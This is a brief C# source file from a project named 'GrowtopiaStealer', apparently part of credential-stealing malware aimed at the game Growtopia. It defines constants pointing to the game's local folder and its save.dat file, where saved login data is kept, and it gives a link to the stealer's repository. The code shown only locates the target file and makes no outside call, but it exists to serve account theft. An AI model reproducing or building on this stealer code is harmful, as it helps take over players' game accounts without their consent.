using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace GrowtopiaStealer
{
    class Growtopia // https://github.com/TheC0mpany/GrowtopiaStealer
    {
        #region Growtopia Paths
        // Growtopia folder path
        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia";
        // Growtopia save.dat path
        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
        #endregion
    }
}